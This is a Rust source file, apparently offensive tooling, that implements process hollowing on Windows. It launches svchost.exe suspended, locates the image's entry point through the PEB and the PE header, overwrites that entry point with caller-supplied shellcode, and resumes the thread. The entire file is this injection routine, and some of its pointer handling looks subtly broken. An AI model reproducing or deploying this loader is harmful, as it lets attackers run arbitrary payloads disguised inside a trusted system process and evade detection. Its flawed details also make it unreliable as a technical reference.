extern crate byteorder;
extern crate windows;
use byteorder::{LittleEndian, ReadBytesExt};
use std::{io, mem, ptr};
use std::ffi::{CString, c_void};
use windows::Win32::Foundation::PWSTR;
use windows::Win32::Security::SECURITY_ATTRIBUTES;
use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
use windows::Win32::System::Threading::{CreateProcessW, CREATE_SUSPENDED, NtQueryInformationProcess, PROCESS_BASIC_INFORMATION, PROCESS_INFORMATION, ResumeThread, STARTUPINFOW};



pub fn hollow_and_run(shellcode: &[u8]) {
    // Create empty StartupInfoW struct for use in CreateProcess
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfow
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/struct.STARTUPINFOW.html
    let startup_info: STARTUPINFOW = unsafe { mem::zeroed() };

    // Create empty ProcessInformation struct for use in CreateProcess
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/struct.PROCESS_INFORMATION.html
    let mut process_information: PROCESS_INFORMATION = unsafe { mem::zeroed() };

    // Use CreateProcessW to create a suspended process that will be hollowed out for the shellcode
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.CreateProcessW.html
    let lp_application_name: PWSTR = unsafe { mem::zeroed() };
    let mut lp_command_line: PWSTR = unsafe { mem::zeroed() };
    lp_command_line.0 = CString::new("C:\\Windows\\System32\\svchost.exe").unwrap().into_raw() as *mut u16;
    let lp_process_attributes: SECURITY_ATTRIBUTES = unsafe { mem::zeroed() };
    let lp_thread_attributes: SECURITY_ATTRIBUTES = unsafe { mem::zeroed() };
    let lp_environment: c_void = unsafe { mem::zeroed() };
    let lp_current_directory: PWSTR = unsafe { mem::zeroed() };
    let creation_result = unsafe { CreateProcessW(
        lp_application_name,
        lp_command_line,
        &lp_process_attributes,
        &lp_thread_attributes,
        false,
        CREATE_SUSPENDED,
        &lp_environment,
        &lp_current_directory,
        &startup_info,
        &mut process_information) };

    if !creation_result.as_bool() {
        panic!("Could not create the suspended process with CreateProcessW");
    }

    // Create empty PROCESS_BASIC_INFORMATION struct for use in ZwQueryInformationProcess
    // WINDOWS --> https://www.pinvoke.net/default.aspx/Structures/PROCESS_BASIC_INFORMATION.html
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/struct.PROCESS_BASIC_INFORMATION.html
    let process_handle = process_information.hProcess;
    let mut basic_information: PROCESS_BASIC_INFORMATION = unsafe { mem::zeroed() };
    let basic_info_as_c_void = &mut basic_information as *mut _ as  *mut c_void;
    let pointer_size = mem::size_of::<&u8>();
    let pointer_size_times_six = (pointer_size * 6).try_into().unwrap();
    
    // Get the PEB base address of the suspended process with ZwQueryInformationProcess
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/procthread/zwqueryinformationprocess
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.NtQueryInformationProcess.html
    if let Err(error) = unsafe { NtQueryInformationProcess(process_handle, 0, basic_info_as_c_void, pointer_size_times_six, ptr::null_mut()) } {
        panic!("Could not get the entry point with ZwQueryInformationProcess: {error}");
    }

    // Use ReadProcessMemory to read 8 bytes of memory; the address of the code base
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Diagnostics/Debug/fn.ReadProcessMemory.html
    let entry_point = basic_information.PebBaseAddress as u64 + 0x10;
    let entry_point_c_void = entry_point as *const c_void;
    let mut address_buffer = vec![0; pointer_size];
    let address_buffer_c_void = &mut address_buffer as *mut _ as  *mut c_void;
    let read_result = unsafe { ReadProcessMemory(process_handle, entry_point_c_void, address_buffer_c_void, address_buffer.len(), ptr::null_mut()) };

    if !read_result.as_bool() {
        panic!("Could not read the address of the code base with ReadProcessMemory");
    }

    // Use ReadProcessMemory again to read 512 bytes of memory; the PE header
    let mut svchost_base = io::Cursor::new(address_buffer);
    let svchost_base = svchost_base.read_u64::<LittleEndian>().unwrap();
    let svchost_base_c_void = svchost_base as *const c_void;
    let mut header_buffer = vec![0; 0x200];
    let header_buffer_c_void = &mut header_buffer as *mut _ as  *mut c_void;
    let read_result = unsafe { ReadProcessMemory(process_handle, svchost_base_c_void, header_buffer_c_void, header_buffer.len(), ptr::null_mut()) };

    if !read_result.as_bool() {
        panic!("Could not read the PE header with ReadProcessMemory");
    }

    // Write the shellcode to the suspended process with WriteProcessMemory
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Diagnostics/Debug/fn.WriteProcessMemory.html
    let e_lfanew_offset = &header_buffer[0x3C..0x40];
    let mut e_lfanew_offset = io::Cursor::new(e_lfanew_offset);
    let e_lfanew_offset = e_lfanew_offset.read_u32::<LittleEndian>().unwrap();
    let opthdr: usize = (e_lfanew_offset + 0x28).try_into().unwrap();
    let entry_point_rva = &header_buffer[opthdr..opthdr + 0x4];
    let mut entry_point_rva = io::Cursor::new(entry_point_rva);
    let entry_point_rva = entry_point_rva.read_u32::<LittleEndian>().unwrap();
    let address_of_entry_point = entry_point_rva as u64 + svchost_base;
    let address_of_entry_point_c_void = address_of_entry_point as *const c_void;
    let shellcode_c_void = & shellcode as *const _ as  *const c_void;
    let write_result = unsafe { WriteProcessMemory(process_handle, address_of_entry_point_c_void, shellcode_c_void, shellcode.len(), ptr::null_mut()) };

    if !write_result.as_bool() {
        panic!("Could not write the shellcode to the suspended process with WriteProcessMemory");
    }

    // Start it back up with ResumeThread
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.ResumeThread.html
    unsafe { ResumeThread(process_information.hThread) };
}